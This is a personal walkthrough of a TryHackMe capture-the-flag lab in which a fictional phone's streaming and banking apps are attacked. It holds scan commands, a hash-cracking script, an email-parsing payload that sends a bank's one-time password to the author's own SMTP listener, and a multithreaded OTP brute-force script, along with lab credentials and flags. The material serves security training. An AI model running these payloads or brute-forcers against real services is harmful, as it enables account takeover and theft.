@@ -1,0 +1,714 @@
+2026-01-18 19:52:00 EST -- START TIME
+# BreachBlocker Unlocker
+--------------------------------------
+
+|================================================================
+- Name: 
+- IP Address: 10.66.139.140
+- OS: 
+- Notes: 
+
+//CREDS:
+	PHONE_PASSCODE = "210701"
+	Hopflix:
+		sbreachblocker@easterbunnies.thm | malharerocks
+	Hopsec Bank:
+		sbreachblocker@easterbunnies.thm | malharerocks
+		(NEEDs a OTP for each login)
+
+//Flags:
+	THM{eggsposed_source_code}
+	THM{fluffier_things_season_4}
+	THM{neggative_balance}
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Finding the Key
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+In the Advent of Cyber Day 21 room, we are given a ZIP file and its password.
+
+Downloading the archive and extracting it with the provided password, we find an HTA file inside.
+
+wget -q https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip
+
+//Password: CanYouREM3?
+
+//Used AI to Solve:
+throne123*
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+## Introduction
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+### Hopper the Detective
+//When Sir BreachBlocker is captured, Hopper senses an opportunity: the last key to the stolen AoC charity funds is hidden somewhere on Sir BreachBlocker’s seized phone.
+
+//The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
+
+ip=10.66.139.140
+
+//This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
+
+Visit: firefox-esr http://$ip:21337/
+Memory Key: throne123*
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
+
+echo $ports
+//22,25,8443,21337
+
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 39:1f:42:56:2e:b6:16:d0:a3:a3:94:18:54:4b:39:39 (ECDSA)
+|_  256 b4:c9:9c:3b:78:e1:5a:d5:cc:00:86:8c:67:1e:d5:25 (ED25519)
+25/tcp    open  smtp     Postfix smtpd
+| smtp-commands: hostname, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+|_ 2.0.0 Commands: AUTH BDAT DATA EHLO ETRN HELO HELP MAIL NOOP QUIT RCPT RSET STARTTLS VRFY XCLIENT XFORWARD
+8443/tcp  open  ssl/http nginx 1.29.3
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.29.3
+|_http-title: Mobile Portal
+| tls-alpn: 
+|   h2
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2025-12-11T05:00:31
+|_Not valid after:  2026-12-11T05:00:31
+21337/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
+|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
+|_http-title: Unlock Hopper's Memories
+
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Adding host
+-- Add /etc/hosts file entries --
+echo -e "$ip \t breachblocker.thm" | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+// 8443/tcp	ssl/http nginx 1.29.3
+//https://$ip:8443/
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//This is a phone landing page, there is a mobile portal with a few apps installed.
+
+//Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+feroxbuster -k -u https://breachblocker:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out
+
+200  https://breachblocker.thm:8443/main.js
+200  https://breachblocker.thm:8443/selfie.png
+200  https://breachblocker.thm:8443/wallpaper.png
+200  https://breachblocker.thm:8443/breaky.png
+200  https://breachblocker.thm:8443/
+200  https://breachblocker.thm:8443/index.html
+200  https://breachblocker.thm:8443/hopflix-874297.db
+200  https://breachblocker.thm:8443/main.py
+200  https://breachblocker.thm:8443/requirements.txt
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Grab WebFiles
+curl -k https://breachblocker.thm:8443/main.js -o main.js
+curl -k https://breachblocker.thm:8443/index.html -o index.html
+curl -k https://breachblocker.thm:8443/requirements.txt -o requirements.txt
+curl -k https://breachblocker.thm:8443/main.py -o main.py
+
+
+//I need an account number and a pin to sign into the banking app, so let’s enumerate the phone some more.
+
+//The email field in Hopflix is prefilled which grants Sir BreachBlocker’s email. Checking the inbox discloses that the charity funds are locked.
+
+
+//HOPFLIX
+sbreachblocker@easterbunnies.thm
+
+
+//There are some interesting text messages to say the least but the only other thing of note was an option to disable the face id on the authenticator, however that requires a 6 digit passcode.
+
+//A bit more digging and I found a phone passcode hardcoded in main.js
+
+const PHONE_PASSCODE = "210701"
+
+//I turned off the authenticator face id so I don’t have issues in the future.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// First Flag
+//What's the CODE_FLAG?
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+vim main.py
+
+#Found a flag in the main.py
+
+//THM{eggsposed_source_code}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Second Flag
+//What's the HOPFLIX_FLAG?
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.
+
+curl -k https://breachblocker.thm:8443/hopflix-874297.db -o hopflix-874297.db
+//Got it
+
+curl -k https://breachblocker.thm:8443/hopsecbank-12312497.db
+//Nothing
+
+file hopflix-874297.db
+hopflix-874297.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+
+sqlite3 hopflix-874297.db
+
+//List all Tables
+sqlite> .tables
+users
+
+//Dumping the database reveals a suspiciously long hash for the user sbreachblocker@easterbunnies.thm.
+
+//Dump Database
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE users (email text, full_name text, password_hash text);
+INSERT INTO users VALUES('sbreachblocker@easterbunnies.thm','Sir BreachBlocker','03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a');
+COMMIT;
+
+//Make note:
+echo '03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a' > sbreachblocker.hash
+
+//The Hopflix authentication system implements a non-standard password hashing scheme where each password character is hashed independently using repeated SHA-1, then concatenated. This design allows the password to be recovered character-by-character offline using the database dump and application source code.
+
+//Inspecting the login logic shows that the password hash is constructed by taking each character of the password, hashing it with SHA-1 for 5000 iterations, and then concatenating the results.
+
+// flag2_solve.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+import hashlib
+import string
+
+HASH_HEX = "03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a"
+
+ITERATIONS = 1000  # <-- IMPORTANT: this hash file matches 1000, not 5000
+CHUNK_SIZE = 40
+
+def chain_sha1(s: str, n: int) -> str:
+    res = s
+    for _ in range(n):
+        res = hashlib.sha1(res.encode()).hexdigest()
+    return res
+
+chunks = [HASH_HEX[i:i+CHUNK_SIZE] for i in range(0, len(HASH_HEX), CHUNK_SIZE)]
+
+# Build rainbow table for printable ASCII
+alphabet = ''.join(chr(i) for i in range(32, 127))  # space..~
+lookup = {chain_sha1(ch, ITERATIONS): ch for ch in alphabet}
+
+password = ''.join(lookup.get(c, '?') for c in chunks)
+print(password)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+python flag2_solve.py
+//malharerocks
+
+
+//WebSite
+	https://breachblocker.thm:8443/
+
+//Go to the Hopflix app
+
+//Creds
+	sbreachblocker@easterbunnies.thm | malharerocks
+
+
+//THM{fluffier_things_season_4}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Third Flag
+//What's the BANK_FLAG?
+#URL: https://breachblocker.thm:8443
+#Account ID:	sbreachblocker@easterbunnies.thm
+#Pin/Password:	malharerocks 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# Possible RoadMap: (OTP email → 2FA → release)
+- Server returns trusted_emails or trusted_domains for OTP routing
+- OTP is emailed (SMTP) and then verified by /api/verify-2fa
+- After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}
+
+- /api/bank-login → creates Flask session
+- /api/send-2fa → generates OTP for that session
+- /api/verify-2fa → checks OTP
+
+
+// SMTP Method (Fastest)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Lets try using the same credentials we obtained for Hopflix to log in to the Hopsec Bank application.
+
+//Log in successful; however, after authentication, the application asks us to choose an email address to which a 2FA OTP code will be sent.
+
+//After selecting any of the listed email addresses, the application prompts us to enter the 2FA OTP that was supposedly sent to that email, which we do NOT have access to.
+
+//Looking at the code responsible for OTP generation, we see that the application generates a random code and then calls the send_otp_email function, passing both the generated code and the email address supplied by the user.
+
+
+// main.py (send_otp_email)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+...
+@app.route('/api/send-2fa', methods=['POST'])
+def send_2fa():
+    data = request.json
+    otp_email = str(data.get('otp_email', ''))
+    
+    if not session.get('bank_authenticated', False):
+        return jsonify({'error': 'Access denied.'}), 403
+    
+    # Generate 2FA code
+    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
+    session['bank_2fa_code'] = encrypt(two_fa_code)
+
+    if send_otp_email(two_fa_code, otp_email) != -1:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'success': False})
+...
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Inspecting the send_otp_email function, we see that it performs several checks to validate the supplied email address. It ensures the email format is valid, restricts certain characters, and verifies that either the full email address or the domain is allowed.
+
+
+// main.py (validate_email)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+def validate_email(email):
+    if '@' not in email:
+        return False
+    if any(ord(ch) <= 32 or ord(ch) >=126 or ch in [',', ';'] for ch in email):
+        return False
+
+    return True
+
+def send_otp_email(otp, to_addr):
+    if not validate_email(to_addr):
+        return -1
+
+    allowed_emails= session['bank_allowed_emails']
+    allowed_domains= session['bank_allowed_domains']
+    domain = to_addr.split('@')[-1]
+    if domain not in allowed_domains and to_addr not in allowed_emails:
+        return -1
+
+    from_addr = 'no-reply@hopsecbank.thm'
+    message = f"""\
+    Subject: Your OTP for HopsecBank
+
+    Dear you,
+    The OTP to access your banking app is {otp}.
+
+    Thanks for trusting Hopsec Bank!"""
+
+    s = smtplib.SMTP('smtp')
+    s.sendmail(from_addr, to_addr, message)
+    s.quit()
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//However, this logic is flawed. The condition:
+
+if domain not in allowed_domains and to_addr not in allowed_emails:
+    return -1
+
+//Does not enforce that both the domain and the full email address are valid. Instead, it allows the email to pass as long as either the domain or the full address is permitted. Since the domain is extracted using to_addr.split('@')[-1], we can manipulate the email address so that the extracted domain matches an allowed domain.
+
+//By ensuring the email ends with @easterbunnies.thm, the check domain not in allowed_domains always evaluates to False, and the entire condition becomes:
+
+if False and to_addr not in allowed_emails:
+
+//Which allows the function to continue, regardless of the actual destination address.
+
+//To abuse this behavior, we can use a known SMTP parsing trick:
+https://portswigger.net/research/splitting-the-email-atom
+
+//The article describes how the ( character can be used to comment out parts of an email address. Using this technique, we can specify our own email address and append (@easterbunnies.thm to satisfy the domain check.
+
+//First, lets start a simple SMTP server to receive incoming emails:
+
+//Install
+virtualenv aiosmtpd
+source aiosmtpd/bin/activate
+pip3 install aiosmtpd
+
+//Install (alt)
+apt install python3-aiosmtpd
+
+//Start Listener
+aiosmtpd -nl 0.0.0.0:25
+
+//Next, lets intercept the request that sends the OTP email and replace the email address with the following payload (Make sure you use your own ip for how you are connected to THM)
+
+ghost@[192.168.135.149](@easterbunnies.thm
+
+//This will cause the OTP email to be delivered to ghost@[192.168.135.149] AKA my smtp listener, while still passing the application’s validation logic.
+
+
+#NOTE: Make sure you have Burp in INTERCEPT mode before selecting the email. This allows us to capture the packet and forward our otp_email payload.
+
+//Open BurpSuite, use creds for the HopeSec Bank and select either email to send the OTP. Forward the packet once you change out "otp_email" with your payload and you should see an email in your aiosmtpd listener.
+
+URL: https://breachblocker.thm:8443
+Account ID:    sbreachblocker@easterbunnies.thm
+Pin/Password:  malharerocks 
+
+#NOTE: Make sure you stay on the HopSec Bank Two-Factor Authentication page till we can get the OTP via SMTP.
+
+Original: "otp_email":"carrotbane@easterbunnies.thm"
+Payload: "otp_email":"ghost@[192.168.135.149](@easterbunnies.thm"
+
+//Forwarding the modified request confirms that the bypass works, and we successfully receive the OTP code.
+
+// aiosmtpd listener for OTP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+$ aiosmtpd -nl 0.0.0.0:25
+
+---------- MESSAGE FOLLOWS ----------
+Received: from [172.18.0.2] (sq5_app-v2_1.sq5_default [172.18.0.2])
+        by hostname (Postfix) with ESMTP id 2A3B6FAA7A
+        for <ghost@[192.168.135.149]>; Tue, 03 Feb 2026 04:37:12 +0000 (UTC)
+X-Peer: ('10.66.139.140', 34924)
+
+    Subject: Your OTP for HopsecBank
+
+    Dear you,
+    The OTP to access your banking app is 564743.
+
+    Thanks for trusting Hopsec Bank!
+------------ END MESSAGE ------------
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//We can now enter the captured OTP code (564743) to complete the login process for Hopsec Bank.
+
+#NOTE: My OTP code will be different for each try. That is why it is important to know how to do this method on your own.
+
+//We are successfully logged in!
+
+//Finally, by clicking the "Release Charity Funds" button, we capture the third flag and complete the room.
+
+//THM{neggative_balance}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// BruteForce Method (Alt)
+#NOTE: This method may take upward of 30 min to solve. You will have to bruteforce through 1,000,000 (one million) total combinations. However, if you get the coding right, you can start it and walk away vs the more hands-on approach with the SMTP method. 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//We can use the same Hopflix creds to login into Hopsec Bank.
+
+//Once authenticated, the server generate a new session for Hopsec Bank, and returns a response indicating that 2FA is required.
+
+//Also by clicking on 'Send OTP' button, a 6-digits OTP encrypted using AES, will be generated and stored inside the session, then sent to the user’s email address.
+
+
+// main.py (Send OTP)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+...
+# Generate 2FA code
+    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
+    session['bank_2fa_code'] = encrypt(two_fa_code)
+
+    if send_otp_email(two_fa_code, otp_email) != -1:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'success': False})
+...
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//The /api/verify-2fa endpoint in main.py does not implement rate limiting, and while an invalid OTP deletes the stored code.
+
+...
+if code == decrypt(session.get('bank_2fa_code')):
+    session['bank_2fa_verified'] = True
+...
+
+if 'bank_2fa_code' in session:
+    del session['bank_2fa_code']
+...
+
+
+//The authenticated session remains valid for each OTP request.
+
+//Because the session remains active and OTP attempts are unrestricted, the OTP verification mechanism can be abused through repeated attempts within the same authenticated session.
+
+
+//Login
+URL: https://breachblocker.thm:8443
+Account ID:    sbreachblocker@easterbunnies.thm
+Pin/Password:  malharerocks
+
+//Lets walk through the login process and the cookies given:
+
+// 1st: /api/bank-login
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# Request
+POST /api/bank-login HTTP/2
+Host: breachblocker.thm:8443
+Content-Length: 70
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://breachblocker.thm:8443
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://breachblocker.thm:8443/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"account_id":"sbreachblocker@easterbunnies.thm","pin":"malharerocks"}
+
+
+# Response
+HTTP/2 200 OK
+Server: nginx/1.29.3
+Date: Tue, 03 Feb 2026 06:19:20 GMT
+Content-Type: application/json
+Content-Length: 115
+Vary: Cookie
+Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aYGTaA.gcvwdqNj8dhqnzf3PoRdvcIqPL8; HttpOnly; Path=/
+
+{"requires_2fa":true,"success":true,"trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 2nd: /api/send-2fa
+#NOTE: I chose the carrotbane@easterbunnies.thm, but it doesn't matter. The session cookies do.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# Request
+POST /api/send-2fa HTTP/2
+Host: breachblocker.thm:8443
+Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aYGTaA.gcvwdqNj8dhqnzf3PoRdvcIqPL8
+Content-Length: 44
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://breachblocker.thm:8443
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://breachblocker.thm:8443/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"otp_email":"carrotbane@easterbunnies.thm"}
+
+
+# Response
+HTTP/2 200 OK
+Server: nginx/1.29.3
+Date: Tue, 03 Feb 2026 06:19:38 GMT
+Content-Type: application/json
+Content-Length: 17
+Vary: Cookie
+Set-Cookie: session=.eJxtjuELwUAYh_-X96uF-EArhdqEpJTYpPXu7t12ud1yd0OT_91IFD4_z-_pd4UY1SHqJBixghO4oNp-b-qJrWRlo7Hqt7MqlWnYPcaz0LtsjM_H3qKzClvKTtbHUbWcB8EAnE_mRFokgji4CUpDL4JSFmfiES9yFMqAuwNCY0nHpVKCTNNmOey_ZKpd-XQZal3YGtLwd-ZAjjJD_Y-9k6XNSFnB0D6uWV3S7Q6IjVrY.aYGTeg.Cikeq08TTwLp9CzA1WUK7wAJjl4; HttpOnly; Path=/
+
+{"success":true}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//The Response session cookie is what we will need to bruteforce. This only the session cookie you should be using for the brute-force. The reason for this is that this what the server expects on its end. 
+
+#NOTE: It will different each time, so make sure you take note of it.
+
+//From my Response the session cookie for /api/send-2fa:
+Set-Cookie: session=.eJxtjuELwUAYh_-X96uF-EArhdqEpJTYpPXu7t12ud1yd0OT_91IFD4_z-_pd4UY1SHqJBixghO4oNp-b-qJrWRlo7Hqt7MqlWnYPcaz0LtsjM_H3qKzClvKTtbHUbWcB8EAnE_mRFokgji4CUpDL4JSFmfiES9yFMqAuwNCY0nHpVKCTNNmOey_ZKpd-XQZal3YGtLwd-ZAjjJD_Y-9k6XNSFnB0D6uWV3S7Q6IjVrY.aYGTeg.Cikeq08TTwLp9CzA1WUK7wAJjl4
+
+//We can use python code to brute force the OTP using our Hopsec Bank session:
+
+// Brute_Force (sixDigit_OTP_bruteforce.py)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+"""
+Purpose:
+--------
+This script performs a high-speed, multi-threaded brute-force attack against a
+6-digit Time-Based One-Time Password (TOTP) verification endpoint.
+
+It iterates through all possible 6-digit OTP values (000000–999999) using
+concurrent HTTP requests while maintaining a valid authenticated session.
+The script monitors server responses to detect successful authentication,
+session invalidation, or error conditions, and terminates early upon success.
+
+Key Features:
+-------------
+- Multi-threaded execution for maximum throughput
+- Reusable HTTP session for reduced latency
+- Progress tracking with real-time ETA
+- Early termination on OTP discovery or session loss
+
+Usage:
+------
+For authorized and educational purposes only.
+Change URL, SESSION, HEADERS, and THREADS variables for your needs.
+
+By: xGh05t
+"""
+
+import requests
+import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm
+import threading
+
+urllib3.disable_warnings()
+
+URL = "https://breachblocker.thm:8443/api/verify-2fa"
+
+SESSION = ".eJxtjuELwUAYh_-X96uF-EArhdqEpJTYpPXu7t12ud1yd0OT_91IFD4_z-_pd4UY1SHqJBixghO4oNp-b-qJrWRlo7Hqt7MqlWnYPcaz0LtsjM_H3qKzClvKTtbHUbWcB8EAnE_mRFokgji4CUpDL4JSFmfiES9yFMqAuwNCY0nHpVKCTNNmOey_ZKpd-XQZal3YGtLwd-ZAjjJD_Y-9k6XNSFnB0D6uWV3S7Q6IjVrY.aYGTeg.Cikeq08TTwLp9CzA1WUK7wAJjl4"
+
+HEADERS = {
+    "Content-Type": "application/json",
+    "Cookie": f"session={SESSION}",
+    "Connection": "keep-alive"
+}
+
+START = 100000
+END = 1000000
+THREADS = 40   # Threads can be adjusted (20–60 is usually the sweet spot)
+
+stop_event = threading.Event()
+
+
+def check_otp(session, otp):
+    if stop_event.is_set():
+        return None
+
+    try:
+        r = session.post(
+            URL,
+            headers=HEADERS,
+            json={"code": otp},
+            verify=False,
+            allow_redirects=False,
+            timeout=3
+        )
+    except requests.exceptions.RequestException:
+        return None
+
+    if "No 2FA code generated" in r.text:
+        stop_event.set()
+        return ("SESSION_LOST", otp, r.text)
+
+    # Your detection logic
+    if len(r.text) != 25:
+        stop_event.set()
+        return ("FOUND", otp, r.text)
+
+    return None
+
+
+def main():
+    otps = (f"{i:06d}" for i in range(START, END))
+    total = END - START
+
+    with requests.Session() as session:
+        with ThreadPoolExecutor(max_workers=THREADS) as executor:
+            futures = [executor.submit(check_otp, session, otp) for otp in otps]
+
+            for future in tqdm(as_completed(futures), total=total, desc="Bruteforcing OTP", unit="otp"):
+                result = future.result()
+
+                if result:
+                    status, otp, response = result
+
+                    if status == "FOUND":
+                        tqdm.write(f"\n[+] OTP FOUND: {otp}")
+                        tqdm.write(f"Response: {response}")
+                    elif status == "SESSION_LOST":
+                        tqdm.write("\n[!] SESSION LOST – OTP DELETED")
+                        tqdm.write(f"Response: {response}")
+
+                    stop_event.set()
+                    break
+
+
+if __name__ == "__main__":
+    main()
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//This will take some time, but eventually you should end up with the OTP.
+
+
+//Run
+python3 sixDigit_OTP_bruteforce.py
+                                                                                                   
+[+] OTP FOUND: 765627
+Response: {"success":true}                                                                         
+
+Bruteforcing OTP:  74%|█████████████████████████▏        | 665629/900000 [18:45<06:36, 591.58otp/s]
+
+
+//This brute-force took roughly 19 minutes to solve to give the answer (765627).
+
+//We can now enter the captured OTP code (765627) to complete the login process for Hopsec Bank.
+
+#NOTE: My OTP code will be different for each try. That is why it is important to know how to do this method on your own.
+        
+//We are successfully logged in!
+
+//Finally, by clicking the "Release Charity Funds" button, we capture the third flag and complete the room.
+    
+//THM{neggative_balance}
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2026-02-03 02:29:08 EST -- COMPLETE
+
